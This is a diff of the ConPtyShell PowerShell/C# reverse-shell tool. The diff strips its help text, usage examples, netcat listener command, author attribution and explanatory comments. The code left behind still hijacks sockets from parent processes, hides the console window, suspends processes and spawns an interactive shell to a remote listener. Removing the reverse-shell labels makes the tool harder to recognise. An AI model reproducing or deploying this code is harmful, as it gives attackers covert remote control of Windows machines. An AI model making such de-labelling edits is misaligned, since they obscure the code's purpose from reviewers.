@@ -1,73 +1,5 @@
 function Invoke-ConPtyShell
 {   
-    <#
-        .SYNOPSIS
-            ConPtyShell - Fully Interactive Reverse Shell for Windows 
-            Author: splinter_code
-            License: MIT
-            Source: https://github.com/antonioCoco/ConPtyShell
-        
-        .DESCRIPTION
-            ConPtyShell - Fully interactive reverse shell for Windows
-            
-            Properly set the rows and cols values. You can retrieve it from
-            your terminal with the command "stty size".
-            
-            You can avoid to set rows and cols values if you run your listener
-            with the following command:
-                stty raw -echo; (stty size; cat) | nc -lvnp 3001
-           
-            If you want to change the console size directly from powershell
-            you can paste the following commands:
-                $width=80
-                $height=24
-                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
-                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
-            
-            
-        .PARAMETER RemoteIp
-            The remote ip to connect
-        .PARAMETER RemotePort
-            The remote port to connect
-        .PARAMETER Rows
-            Rows size for the console
-            Default: "24"
-        .PARAMETER Cols
-            Cols size for the console
-            Default: "80"
-        .PARAMETER CommandLine
-            The commandline of the process that you are going to interact
-            Default: "powershell.exe"
-            
-        .EXAMPLE  
-            PS>Invoke-ConPtyShell 10.0.0.2 3001
-            
-            Description
-            -----------
-            Spawn a reverse shell
-
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Spawn a reverse shell with specific rows and cols size
-            
-         .EXAMPLE
-            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
-            
-            Description
-            -----------
-            Spawn a reverse shell (cmd.exe) with specific rows and cols size
-            
-        .EXAMPLE
-            PS>Invoke-ConPtyShell -Upgrade -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Upgrade your current shell with specific rows and cols size
-            
-    #>
     Param
     (
         [Parameter(Position = 0)]
@@ -170,11 +102,9 @@ public class DeadlockCheckHelper
         LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
         IntPtr hThread = IntPtr.Zero;
         uint threadId = 0;
-        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
         hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
         WaitForSingleObject(hThread, 1500);
-        //we do not kill the "pending" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
-        //just some waste of threads :(
+        
         CloseHandle(hThread);
         return this.deadlockDetected;
     }
@@ -394,27 +324,13 @@ public static class SocketHijacking
         public Int32 LocalAddressLength;
         public Int32 RemoteAddressLength;
 
-        // Socket options controlled by getsockopt(), setsockopt().
         public linger LingerInfo;
         public UInt32 SendTimeout;
         public UInt32 ReceiveTimeout;
         public UInt32 ReceiveBufferSize;
         public UInt32 SendBufferSize;
-        /* Those are the bits in the SocketProerty, proper order:
-            Listening;
-            Broadcast;
-            Debug;
-            OobInline;
-            ReuseAddresses;
-            ExclusiveAddressUse;
-            NonBlocking;
-            DontUseWildcard;
-            ReceiveShutdown;
-            SendShutdown;
-            ConditionalAccept;
-        */
+
         public ushort SocketProperty;
-        // Snapshot of several parameters passed into WSPSocket() when creating this socket
         public UInt32 CreationFlags;
         public UInt32 CatalogEntryId;
         public UInt32 ServiceFlags1;
@@ -448,7 +364,6 @@ public static class SocketHijacking
         public UInt32 Padding;
         public SOCKADDR LocalAddress;
         public SOCKADDR RemoteAddress;
-        // Helper Data - found out with some reversing
         [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
         public byte[] HelperData;
     }
@@ -472,7 +387,6 @@ public static class SocketHijacking
     [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
     private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);
 
-    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
     [DllImport("Ws2_32.dll", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "WSAIoctl")]
     public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);
 
@@ -504,14 +418,12 @@ public static class SocketHijacking
     [DllImport("ntdll.dll")]
     private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);
 
-    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
     [DllImport("ntdll.dll", EntryPoint = "NtDeviceIoControlFile")]
     private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);
 
     [DllImport("Ws2_32.dll")]
     public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
     
-    //helper method with "dynamic" buffer allocation
     private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -540,15 +452,12 @@ public static class SocketHijacking
         return ptrObjectTypesInformation;
     }
 
-    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
     private static long AlignUp(long address, long align)
     {
         return (((address) + (align) - 1) & ~((align) - 1));
     }
 
-    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "way" of counting index types.
-    // credits for this goes to @0xrepnz
-    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
+
     private static byte GetTypeIndexByName(string ObjectName)
     {
         byte TypeIndex = 0;
@@ -600,8 +509,7 @@ public static class SocketHijacking
                 closesocket(sock);
                 continue;
             }
-            // Console.WriteLine("debug: Socket handle 0x" + sock.ToString("X4") + " is in tcpstate " + sockInfo.State.ToString());
-            // we need only active sockets, the remaing sockets are filtered out
+       
             if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
             {
                 SOCKET_BYTESIN sockBytesIn = new SOCKET_BYTESIN();
@@ -614,7 +522,6 @@ public static class SocketHijacking
         }
         if (socketsBytesIn.Count < 1) return socketsOut;
         if (socketsBytesIn.Count >= 2)
-            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
             socketsBytesIn.Sort(delegate (SOCKET_BYTESIN a, SOCKET_BYTESIN b) { return (a.BytesIn.CompareTo(b.BytesIn)); });
         foreach (SOCKET_BYTESIN sockBytesIn in socketsBytesIn)
         {
@@ -644,7 +551,6 @@ public static class SocketHijacking
         return true;
     }
 
-    // this function take a raw handle to a \Device\Afd object as a parameter and returns a handle to a duplicated socket
     private static IntPtr DuplicateSocketFromHandle(IntPtr socketHandle)
     {
         IntPtr retSocket = IntPtr.Zero;
@@ -653,7 +559,6 @@ public static class SocketHijacking
         int status = WSADuplicateSocket(socketHandle, Process.GetCurrentProcess().Id, ref wsaProtocolInfo);
         if (status == 0)
         {
-            // we need an overlapped socket for the conpty process but we don't need to specify the WSA_FLAG_OVERLAPPED flag here because it will be ignored (and automatically set) by WSASocket() function if we set the WSAPROTOCOL_INFO structure and if the original socket has been created with the overlapped flag.
             duplicatedSocket = WSASocket(wsaProtocolInfo.iAddressFamily, wsaProtocolInfo.iSocketType, wsaProtocolInfo.iProtocol, ref wsaProtocolInfo, 0, 0);
             if (duplicatedSocket.ToInt64() > 0)
             {
@@ -663,7 +568,6 @@ public static class SocketHijacking
         return retSocket;
     }
 
-    //helper method with "dynamic" buffer allocation
     public static IntPtr NtQueryObjectDynamic(IntPtr handle, OBJECT_INFORMATION_CLASS infoClass, int infoLength)
     {
         if (infoLength == 0)
@@ -683,14 +587,13 @@ public static class SocketHijacking
                 break;
             else
             {
-                //throw new Exception("Unhandled NtStatus " + result);
                 break;
             }
         }
         if (result == NTSTATUS_SUCCESS)
-            return infoPtr;//don't forget to free the pointer with Marshal.FreeHGlobal after you're done with it
+            return infoPtr;
         else
-            Marshal.FreeHGlobal(infoPtr);//free pointer when not Successful
+            Marshal.FreeHGlobal(infoPtr);
         return IntPtr.Zero;
     }
 
@@ -884,7 +787,6 @@ public static class SocketHijacking
     }
 }
 
-// source from --> https://stackoverflow.com/a/3346055
 [StructLayout(LayoutKind.Sequential)]
 public struct ParentProcessUtilities
 {
@@ -1488,7 +1390,6 @@ public static class ConPtyShell
                     shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);
                     if (shellSocket == IntPtr.Zero && grandParentProcess != null)
                     {
-                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandparent process
                         shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);
                         if (shellSocket == IntPtr.Zero)
                         {
@@ -1501,14 +1402,12 @@ public static class ConPtyShell
                     }
                     else
                     {
-                        // gotcha a usable socket from the parent process, let's see if the grandParent also use the socket
                         parentSocketInherited = true;
                         if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                     }
                 }
                 else
                 {
-                    // the current process got a usable socket, let's see if the parents use the socket
                     if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);
                     if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);
                 }
@@ -1529,10 +1428,7 @@ public static class ConPtyShell
                 ShowWindow(GetConsoleWindow(), SW_HIDE);
                 newConsoleAllocated = true;
             }
-            // debug code for checking handle duplication
-            // Console.WriteLine("debug: Creating pseudo console...");
-            // Thread.Sleep(180000);
-            // return "";
+
             int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
             if (pseudoConsoleCreationResult != 0)
             {
@@ -1563,13 +1459,9 @@ public static class ConPtyShell
             sInfo.hStdError = OutputPipeWrite;
             CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
         }
-        // Note: We can close the handles to the PTY-end of the pipes here
-        // because the handles are dup'ed into the ConHost and will be released
-        // when the ConPTY is destroyed.
         if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
         if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
         if (upgradeShell) {
-            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
             if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
             if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
             if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);
